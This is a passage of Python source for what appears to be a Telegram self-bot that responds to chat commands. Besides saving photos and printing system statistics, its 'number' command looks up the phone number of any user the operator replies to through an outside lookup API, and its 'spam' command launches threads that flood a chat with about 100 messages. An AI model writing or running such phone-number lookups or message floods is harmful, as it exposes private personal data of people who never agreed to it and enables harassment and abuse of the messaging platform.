            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            app.edit_message_text(message.chat.id, message.message_id, f'leaved | Time It: {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        if message.text == 'download photo':
            a = random.randint(1,99999999)
            name = str(a)+'.jpg'
            app.download_media(message.reply_to_message.photo.file_id, name, progress=down(message))
            tim = time.strftime("%H:%M:%S")
            app.edit_message_text(message.reply_to_message.chat.id, message.message_id, f'File Downloaded And Send To Saved Time It: {tim}')
            app.send_photo('me' , 'C:\\Users\\Mehdi\\Desktop\\api\\New folder\\downloads\\'+name , caption=f"Time Save Photo: {tim}" , progress=up(message) )
            cpufreq = psutil.cpu_freq()
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            app.edit_message_text(message.reply_to_message.chat.id, message.message_id, f'Chacking Saved P.m Time It: {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        if message.text == 'number':
            req = requests.get('https://meysam72.tk/api/finder.php?id='+str(message.reply_to_message.from_user.id))
            res = req.json()
            try:
                data = f'''
Number Is: {res["Result"]["phone"]}
Username: {res["Result"]["username"]}
User Id: {res["Result"]['user_id']}
            '''
            except:
                data = 'Number Is Not Found database..!'
            cpufreq = psutil.cpu_freq()
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            app.edit_message_text(message.reply_to_message.chat.id, message.message_id, data+f"\n{khat}\n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}")

        if message.text == 'how':
            a = app.get_users(message.reply_to_message.from_user.username)
            try:
                data = f'''
Name Is: {a['first_name']}
User Id: {a['id']}
SARaZ: {a['is_sARaZ']}
Bot: {a['is_bot']}
User Name: {a['username']}
            '''
            except:
                data = f'''
Name Is: {a['first_name']}
User Id: {a['id']}
SARaZ: {a['is_sARaZ']}
Bot: {a['is_bot']}'''
            cpufreq = psutil.cpu_freq()
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            app.edit_message_text(message.reply_to_message.chat.id, message.message_id, data+f'\n{khat}\n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        if message.text == 'spam':
                threading.Thread(target=sapm , args=([message])).start()
                app.edit_message_text(message.reply_to_message.chat.id , message.message_id , 'Send 100 p.m ..!')
                threading.Thread(target=sapm , args=([message])).start()

app.run()
